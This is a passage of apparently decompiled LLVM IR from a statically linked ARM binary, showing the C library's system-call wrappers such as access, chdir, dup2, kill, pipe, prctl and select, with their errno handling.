  store i32 %v3_13eec, i32* %stack_var_-32, align 4
  %v6_13eec = load i32, i32* @r5, align 4
  %v12_13eec = load i32, i32* @r7, align 4
  %v4_13efc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_13f08 = icmp eq i32 %v4_13efc, 0
  %v0_13f10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13f10, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_13ee8, i32* @r4, align 4
  br i1 %v2_13f08, label %dec_label_pc_13f2c, label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %entry
  %v7_13f20 = icmp eq i32 %arg2, 7
  br i1 %v7_13f20, label %dec_label_pc_13f6c, label %bb

bb:                                               ; preds = %dec_label_pc_13f20
  %v8_13f24 = icmp eq i32 %arg2, 14
  br i1 %v8_13f24, label %dec_label_pc_13f6c, label %dec_label_pc_13f2c

dec_label_pc_13f2c:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_13f10, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_13f10, -4095
  br i1 %tmp, label %dec_label_pc_13f64, label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %dec_label_pc_13f2c
  %v0_13f50 = call i32 @__aeabi_read_tp()
  %v3_13f54 = load i16, i16* @global_var_32088.1320, align 2
  %v4_13f54 = sext i16 %v3_13f54 to i32
  %v0_13f58 = load i32, i32* @r2, align 4
  %v1_13f58 = sub i32 0, %v0_13f58
  store i32 %v1_13f58, i32* @r2, align 4
  %v3_13f5c = add i32 %v4_13f54, %v0_13f50
  %v4_13f5c = inttoptr i32 %v3_13f5c to i32*
  store i32 %v1_13f58, i32* %v4_13f5c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f64

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f2c, %dec_label_pc_13f4c
  %v0_13f64 = phi i32 [ %v0_13f10, %dec_label_pc_13f2c ], [ -1, %dec_label_pc_13f4c ]
  br label %dec_label_pc_13fb8

dec_label_pc_13f6c:                               ; preds = %dec_label_pc_13f20, %bb
  %v0_13f6c = call i32 @__libc_enable_asynccancel()
  %v0_13f70 = load i32, i32* @r7, align 4
  store i32 %v0_13f70, i32* @r1, align 4
  store i32 %v0_13f6c, i32* %r6.global-to-local, align 4
  %v0_13f7c = load i32, i32* @r5, align 4
  store i32 %v0_13f7c, i32* %r0.global-to-local, align 4
  store i32 %v0_13f7c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_13f7c, -4095
  br i1 %tmp15, label %dec_label_pc_13fac, label %dec_label_pc_13f94

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f6c
  %v1_13f98 = sub i32 0, %v0_13f7c
  %v0_13f9c = call i32 @__aeabi_read_tp()
  store i32 %v0_13f9c, i32* %r0.global-to-local, align 4
  %v3_13fa0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_13fa0 = sext i16 %v3_13fa0 to i32
  %v3_13fa4 = add i32 %v4_13fa0, %v0_13f9c
  %v4_13fa4 = inttoptr i32 %v3_13fa4 to i32*
  store i32 %v1_13f98, i32* %v4_13fa4, align 4
  store i32 -1, i32* @r2, align 4
  %v0_13fac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13fac

dec_label_pc_13fac:                               ; preds = %dec_label_pc_13f6c, %dec_label_pc_13f94
  %v0_13fb0 = phi i32 [ %v0_13f7c, %dec_label_pc_13f6c ], [ -1, %dec_label_pc_13f94 ]
  %v0_13fac = phi i32 [ %v0_13f6c, %dec_label_pc_13f6c ], [ %v0_13fac.pre, %dec_label_pc_13f94 ]
  store i32 %v0_13fac, i32* %r0.global-to-local, align 4
  store i32 %v0_13fb0, i32* @r7, align 4
  %v1_13fb4 = call i32 @__libc_disable_asynccancel(i32 %v0_13fac)
  store i32 %v1_13fb4, i32* %r0.global-to-local, align 4
  %v0_13fb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13fb8

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13f64, %dec_label_pc_13fac
  %v0_13fb8 = phi i32 [ %v0_13f64, %dec_label_pc_13f64 ], [ %v0_13fb8.pre, %dec_label_pc_13fac ]
  store i32 %v0_13fb8, i32* %r0.global-to-local, align 4
  %v2_13fc0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13fc0, i32* @r4, align 4
  store i32 %v6_13eec, i32* @r5, align 4
  store i32 %v12_13eec, i32* @r7, align 4
  ret i32 %v0_13fb8

; uselistorder directives
  uselistorder i32 %v0_13fb8, { 1, 0 }
  uselistorder i32 %v0_13fac, { 1, 0 }
  uselistorder i32 %v0_13f7c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13f10, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_13fb8, { 1, 0 }
  uselistorder label %dec_label_pc_13fac, { 1, 0 }
  uselistorder label %dec_label_pc_13f6c, { 1, 0 }
  uselistorder label %dec_label_pc_13f64, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_14014, %dec_label_pc_14028, %entry
  %v0_13fe8 = phi i32 [ %arg1, %entry ], [ %v0_13fe8.pre.pre, %dec_label_pc_14028 ], [ %v0_14014, %dec_label_pc_14014 ]
  store i32 %v0_13fe8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fe8, -4095
  br i1 %tmp, label %dec_label_pc_14014, label %dec_label_pc_14004

dec_label_pc_14004:                               ; preds = %dec_label_pc_13fe8
  %v0_14004 = call i32 @__aeabi_read_tp()
  %v0_14008 = load i32, i32* %r2.global-to-local, align 4
  %v1_14008 = sub i32 0, %v0_14008
  store i32 %v1_14008, i32* %r2.global-to-local, align 4
  %v3_1400c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1400c = sext i16 %v3_1400c to i32
  %v3_14010 = add i32 %v4_1400c, %v0_14004
  %v4_14010 = inttoptr i32 %v3_14010 to i32*
  store i32 %v1_14008, i32* %v4_14010, align 4
  %v0_14014.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %dec_label_pc_13fe8, %dec_label_pc_14004
  %v0_14014 = phi i32 [ %v0_13fe8, %dec_label_pc_13fe8 ], [ %v0_14014.pre, %dec_label_pc_14004 ]
  store i32 %v0_14014, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_14014, -4095
  br i1 %tmp4, label %dec_label_pc_13fe8, label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %dec_label_pc_14014
  %v0_14028 = call i32 @__aeabi_read_tp()
  %v0_1402c = load i32, i32* %r2.global-to-local, align 4
  %v1_1402c = sub i32 0, %v0_1402c
  store i32 %v1_1402c, i32* %r2.global-to-local, align 4
  %v3_14030 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14030 = sext i16 %v3_14030 to i32
  %v3_14034 = add i32 %v4_14030, %v0_14028
  %v4_14034 = inttoptr i32 %v3_14034 to i32*
  store i32 %v1_1402c, i32* %v4_14034, align 4
  %v0_13fe8.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13fe8

; uselistorder directives
  uselistorder i32 %v0_14014, { 0, 2, 1 }
  uselistorder i32 %v0_13fe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14014, { 1, 0 }
  uselistorder label %dec_label_pc_13fe8, { 1, 0, 2 }
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14044 = load i32, i32* @r7, align 4
  store i32 %v3_14044, i32* %stack_var_-8, align 4
  %v0_14050 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14050, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14050, -4095
  br i1 %tmp, label %dec_label_pc_14078, label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %entry
  %v0_14064 = call i32 @__aeabi_read_tp()
  %v3_14068 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14068 = sext i16 %v3_14068 to i32
  %v0_1406c = load i32, i32* %r2.global-to-local, align 4
  %v1_1406c = sub i32 0, %v0_1406c
  store i32 %v1_1406c, i32* %r2.global-to-local, align 4
  %v3_14070 = add i32 %v4_14068, %v0_14064
  %v4_14070 = inttoptr i32 %v3_14070 to i32*
  store i32 %v1_1406c, i32* %v4_14070, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14078.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %entry, %dec_label_pc_14060
  %v1_1407c = phi i32 [ %v0_14050, %entry ], [ -1, %dec_label_pc_14060 ]
  %v2_14078 = phi i32 [ %v3_14044, %entry ], [ %v2_14078.pre, %dec_label_pc_14060 ]
  store i32 %v2_14078, i32* @r7, align 4
  ret i32 %v1_1407c

; uselistorder directives
  uselistorder i32 %v0_14050, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14078, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14084 = load i32, i32* @r7, align 4
  store i32 %v3_14084, i32* %stack_var_-8, align 4
  %v0_14090 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14090, -4095
  br i1 %tmp, label %dec_label_pc_140b0, label %dec_label_pc_14098

dec_label_pc_14098:                               ; preds = %entry
  %v1_1409c = sub i32 0, %v0_14090
  %v3_140a0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_140a0 = sext i16 %v3_140a0 to i32
  %v0_140a4 = call i32 @__aeabi_read_tp()
  %v3_140a8 = add i32 %v4_140a0, %v0_140a4
  %v4_140a8 = inttoptr i32 %v3_140a8 to i32*
  store i32 %v1_1409c, i32* %v4_140a8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_140b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140b0

dec_label_pc_140b0:                               ; preds = %entry, %dec_label_pc_14098
  %v1_140b4 = phi i32 [ %v0_14090, %entry ], [ -1, %dec_label_pc_14098 ]
  %v2_140b0 = phi i32 [ %v3_14084, %entry ], [ %v2_140b0.pre, %dec_label_pc_14098 ]
  store i32 %v2_140b0, i32* @r7, align 4
  ret i32 %v1_140b4

; uselistorder directives
  uselistorder i32 %v0_14090, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140b0, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140bc = load i32, i32* @r7, align 4
  store i32 %v3_140bc, i32* %stack_var_-8, align 4
  %v0_140c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_140c8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_140c8, -4095
  br i1 %tmp, label %dec_label_pc_140f0, label %dec_label_pc_140d8

dec_label_pc_140d8:                               ; preds = %entry
  %v0_140dc = call i32 @__aeabi_read_tp()
  %v3_140e0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_140e0 = sext i16 %v3_140e0 to i32
  %v0_140e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_140e4 = sub i32 0, %v0_140e4
  store i32 %v1_140e4, i32* %r2.global-to-local, align 4
  %v3_140e8 = add i32 %v4_140e0, %v0_140dc
  %v4_140e8 = inttoptr i32 %v3_140e8 to i32*
  store i32 %v1_140e4, i32* %v4_140e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_140f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140f0

dec_label_pc_140f0:                               ; preds = %entry, %dec_label_pc_140d8
  %v1_140f4 = phi i32 [ %v0_140c8, %entry ], [ -1, %dec_label_pc_140d8 ]
  %v2_140f0 = phi i32 [ %v3_140bc, %entry ], [ %v2_140f0.pre, %dec_label_pc_140d8 ]
  store i32 %v2_140f0, i32* @r7, align 4
  ret i32 %v1_140f4

; uselistorder directives
  uselistorder i32 %v0_140c8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140f0, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14100 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1410c = call i32 @getrlimit(i32 7, i32 %v2_14100)
  %v1_14110 = icmp slt i32 %v2_1410c, 0
  %v5_14114 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14110, i32 256, i32 %v5_14114
  ret i32 %storemerge
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_14138 = load i32, i32* @r0, align 4
  ret i32 %v1_14138
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1413c = load i32, i32* @r7, align 4
  store i32 %v3_1413c, i32* %stack_var_-8, align 4
  %v0_14148 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14148, -4095
  br i1 %tmp, label %dec_label_pc_14168, label %dec_label_pc_14150

dec_label_pc_14150:                               ; preds = %entry
  %v1_14154 = sub i32 0, %v0_14148
  %v3_14158 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14158 = sext i16 %v3_14158 to i32
  %v0_1415c = call i32 @__aeabi_read_tp()
  %v3_14160 = add i32 %v4_14158, %v0_1415c
  %v4_14160 = inttoptr i32 %v3_14160 to i32*
  store i32 %v1_14154, i32* %v4_14160, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14168.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14168

dec_label_pc_14168:                               ; preds = %entry, %dec_label_pc_14150
  %v1_1416c = phi i32 [ %v0_14148, %entry ], [ -1, %dec_label_pc_14150 ]
  %v2_14168 = phi i32 [ %v3_1413c, %entry ], [ %v2_14168.pre, %dec_label_pc_14150 ]
  store i32 %v2_14168, i32* @r7, align 4
  ret i32 %v1_1416c

; uselistorder directives
  uselistorder i32 %v0_14148, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14168, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_14174 = load i32, i32* @r3, align 4
  store i32 %v9_14174, i32* %stack_var_-4, align 4
  %v3_14178 = load i32, i32* @r4, align 4
  store i32 %v3_14178, i32* %stack_var_-32, align 4
  %v6_14178 = load i32, i32* @r5, align 4
  %v12_14178 = load i32, i32* @r7, align 4
  %v4_14188 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_14190 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14190, i32* @r3, align 4
  %v2_14194 = icmp eq i32 %v4_14188, 0
  %v0_1419c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1419c, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_14194, label %dec_label_pc_141ac, label %dec_label_pc_141e4

dec_label_pc_141ac:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_1419c, -4095
  br i1 %tmp, label %dec_label_pc_141dc, label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_141ac
  %v1_141c8 = sub i32 0, %v0_1419c
  %v3_141cc = load i16, i16* @global_var_32088.1320, align 2
  %v4_141cc = sext i16 %v3_141cc to i32
  store i32 %v4_141cc, i32* @r3, align 4
  %v0_141d0 = call i32 @__aeabi_read_tp()
  %v2_141d4 = load i32, i32* @r3, align 4
  %v3_141d4 = add i32 %v2_141d4, %v0_141d0
  %v4_141d4 = inttoptr i32 %v3_141d4 to i32*
  store i32 %v1_141c8, i32* %v4_141d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141ac, %dec_label_pc_141c4
  %v0_141dc = phi i32 [ %v0_1419c, %dec_label_pc_141ac ], [ -1, %dec_label_pc_141c4 ]
  br label %dec_label_pc_14230

dec_label_pc_141e4:                               ; preds = %entry
  %v0_141e4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_141e4, i32* %r6.global-to-local, align 4
  %v0_141f4 = load i32, i32* @r4, align 4
  store i32 %v0_141f4, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_141f4, -4095
  br i1 %tmp15, label %dec_label_pc_14224, label %dec_label_pc_1420c

dec_label_pc_1420c:                               ; preds = %dec_label_pc_141e4
  %v1_14210 = sub i32 0, %v0_141f4
  %v3_14214 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14214 = sext i16 %v3_14214 to i32
  store i32 %v4_14214, i32* @r3, align 4
  %v0_14218 = call i32 @__aeabi_read_tp()
  store i32 %v0_14218, i32* %r0.global-to-local, align 4
  %v2_1421c = load i32, i32* @r3, align 4
  %v3_1421c = add i32 %v2_1421c, %v0_14218
  %v4_1421c = inttoptr i32 %v3_1421c to i32*
  store i32 %v1_14210, i32* %v4_1421c, align 4
  %v0_14224.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14224

dec_label_pc_14224:                               ; preds = %dec_label_pc_141e4, %dec_label_pc_1420c
  %v0_14228 = phi i32 [ %v0_141f4, %dec_label_pc_141e4 ], [ -1, %dec_label_pc_1420c ]
  %v0_14224 = phi i32 [ %v0_141e4, %dec_label_pc_141e4 ], [ %v0_14224.pre, %dec_label_pc_1420c ]
  store i32 %v0_14224, i32* %r0.global-to-local, align 4
  store i32 %v0_14228, i32* @r7, align 4
  %v1_1422c = call i32 @__libc_disable_asynccancel(i32 %v0_14224)
  store i32 %v1_1422c, i32* %r0.global-to-local, align 4
  %v0_14230.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14230

dec_label_pc_14230:                               ; preds = %dec_label_pc_141dc, %dec_label_pc_14224
  %v0_14230 = phi i32 [ %v0_141dc, %dec_label_pc_141dc ], [ %v0_14230.pre, %dec_label_pc_14224 ]
  store i32 %v0_14230, i32* %r0.global-to-local, align 4
  %v2_14238 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_14238, i32* @r4, align 4
  store i32 %v6_14178, i32* @r5, align 4
  store i32 %v12_14178, i32* @r7, align 4
  ret i32 %v0_14230

; uselistorder directives
  uselistorder i32 %v0_14230, { 1, 0 }
  uselistorder i32 %v0_14224, { 1, 0 }
  uselistorder i32 %v0_141f4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1419c, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_14230, { 1, 0 }
  uselistorder label %dec_label_pc_14224, { 1, 0 }
  uselistorder label %dec_label_pc_141dc, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14254 = load i32, i32* @r7, align 4
  store i32 %v3_14254, i32* %stack_var_-8, align 4
  %v0_14260 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14260, -4095
  br i1 %tmp, label %dec_label_pc_14280, label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %entry
  %v1_1426c = sub i32 0, %v0_14260
  store i32 %v1_1426c, i32* @r2, align 4
  %v3_14270 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14270 = sext i16 %v3_14270 to i32
  %v0_14274 = call i32 @__aeabi_read_tp()
  %v0_14278 = load i32, i32* @r2, align 4
  %v3_14278 = add i32 %v4_14270, %v0_14274
  %v4_14278 = inttoptr i32 %v3_14278 to i32*
  store i32 %v0_14278, i32* %v4_14278, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14280.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %entry, %dec_label_pc_14268
  %v1_14284 = phi i32 [ %v0_14260, %entry ], [ -1, %dec_label_pc_14268 ]
  %v2_14280 = phi i32 [ %v3_14254, %entry ], [ %v2_14280.pre, %dec_label_pc_14268 ]
  store i32 %v2_14280, i32* @r7, align 4
  ret i32 %v1_14284

; uselistorder directives
  uselistorder i32 %v0_14260, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14280, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1428c = load i32, i32* @r7, align 4
  store i32 %v3_1428c, i32* %stack_var_-8, align 4
  %v0_14298 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14298, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14298, -4095
  br i1 %tmp, label %dec_label_pc_142c0, label %dec_label_pc_142a8

dec_label_pc_142a8:                               ; preds = %entry
  %v0_142ac = call i32 @__aeabi_read_tp()
  %v3_142b0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_142b0 = sext i16 %v3_142b0 to i32
  %v0_142b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_142b4 = sub i32 0, %v0_142b4
  store i32 %v1_142b4, i32* %r2.global-to-local, align 4
  %v3_142b8 = add i32 %v4_142b0, %v0_142ac
  %v4_142b8 = inttoptr i32 %v3_142b8 to i32*
  store i32 %v1_142b4, i32* %v4_142b8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_142c0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_142c0

dec_label_pc_142c0:                               ; preds = %entry, %dec_label_pc_142a8
  %v1_142c4 = phi i32 [ %v0_14298, %entry ], [ -1, %dec_label_pc_142a8 ]
  %v2_142c0 = phi i32 [ %v3_1428c, %entry ], [ %v2_142c0.pre, %dec_label_pc_142a8 ]
  store i32 %v2_142c0, i32* @r7, align 4
  ret i32 %v1_142c4

; uselistorder directives
  uselistorder i32 %v0_14298, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_142c0, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14304, label %dec_label_pc_142ec

dec_label_pc_142ec:                               ; preds = %entry
  %v0_142f0 = call i32 @__aeabi_read_tp()
  %v3_142f4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_142f4 = sext i16 %v3_142f4 to i32
  %v0_142f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_142f8 = sub i32 0, %v0_142f8
  store i32 %v1_142f8, i32* %r2.global-to-local, align 4
  %v3_142fc = add i32 %v4_142f4, %v0_142f0
  %v4_142fc = inttoptr i32 %v3_142fc to i32*
  store i32 %v1_142f8, i32* %v4_142fc, align 4
  br label %dec_label_pc_14304

dec_label_pc_14304:                               ; preds = %entry, %dec_label_pc_142ec
  %v1_14308 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_142ec ]
  ret i32 %v1_14308

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14304, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_14310 = load i32, i32* @r4, align 4
  store i32 %v3_14310, i32* %stack_var_-12, align 4
  %v0_14320 = load i32, i32* @r0, align 4
  store i32 %v0_14320, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_14320, -4095
  br i1 %tmp, label %dec_label_pc_14348, label %dec_label_pc_14330

dec_label_pc_14330:                               ; preds = %entry
  %v0_14334 = call i32 @__aeabi_read_tp()
  %v3_14338 = load i16, i16* @global_var_32088.1320, align 2
  %v4_14338 = sext i16 %v3_14338 to i32
  %v0_1433c = load i32, i32* @r2, align 4
  %v1_1433c = sub i32 0, %v0_1433c
  store i32 %v1_1433c, i32* @r2, align 4
  %v3_14340 = add i32 %v4_14338, %v0_14334
  %v4_14340 = inttoptr i32 %v3_14340 to i32*
  store i32 %v1_1433c, i32* %v4_14340, align 4
  %v2_14348.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14348

dec_label_pc_14348:                               ; preds = %entry, %dec_label_pc_14330
  %v1_1434c = phi i32 [ %v0_14320, %entry ], [ -1, %dec_label_pc_14330 ]
  %v2_14348 = phi i32 [ %v3_14310, %entry ], [ %v2_14348.pre, %dec_label_pc_14330 ]
  store i32 %v2_14348, i32* @r4, align 4
  ret i32 %v1_1434c

; uselistorder directives
  uselistorder i32 %v0_14320, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14348, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14354 = load i32, i32* @r4, align 4
  store i32 %v3_14354, i32* %stack_var_-28, align 4
  %v6_14354 = load i32, i32* @r5, align 4
  %v9_14354 = load i32, i32* @r6, align 4
  %v12_14354 = load i32, i32* @r7, align 4
  %v15_14354 = load i32, i32* @r8, align 4
  %v18_14354 = load i32, i32* @sl, align 4
  %v21_14354 = load i32, i32* @lr, align 4
  %v4_14364 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_1436c = icmp eq i32 %v4_14364, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_1436c, label %dec_label_pc_14388, label %entry.dec_label_pc_14394_crit_edge

entry.dec_label_pc_14394_crit_edge:               ; preds = %entry
  br label %dec_label_pc_14394

dec_label_pc_14388:                               ; preds = %entry
  store i32 %v3_14354, i32* @r4, align 4
  store i32 %v9_14354, i32* @r6, align 4
  store i32 %v12_14354, i32* @r7, align 4
  store i32 %v15_14354, i32* @r8, align 4
  store i32 %v18_14354, i32* %sl.global-to-local, align 4
  %v0_14390 = call i32 @__syscall_select()
  br label %dec_label_pc_14394

dec_label_pc_14394:                               ; preds = %entry.dec_label_pc_14394_crit_edge, %dec_label_pc_14388
  %v0_14394 = call i32 @__libc_enable_asynccancel()
  %v0_14398 = load i32, i32* @r6, align 4
  store i32 %v0_14398, i32* @r1, align 4
  store i32 %v0_14394, i32* @r5, align 4
  %v0_143a8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_143a8, i32* @r0, align 4
  %v0_143b0 = call i32 @__syscall_select()
  store i32 %v0_143b0, i32* @r4, align 4
  %v0_143b8 = load i32, i32* @r5, align 4
  %v1_143bc = call i32 @__libc_disable_asynccancel(i32 %v0_143b8)
  %v0_143c0 = load i32, i32* @r4, align 4
  %v2_143c8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_143c8, i32* @r4, align 4
  store i32 %v6_14354, i32* @r5, align 4
  store i32 %v9_14354, i32* @r6, align 4
  store i32 %v12_14354, i32* @r7, align 4
  store i32 %v15_14354, i32* @r8, align 4
  store i32 %v18_14354, i32* @sl, align 4
  store i32 %v21_14354, i32* @lr, align 4
  ret i32 %v0_143c0

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14394, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_143d8 = load i32, i32* @r7, align 4
  store i32 %v3_143d8, i32* %stack_var_-8, align 4
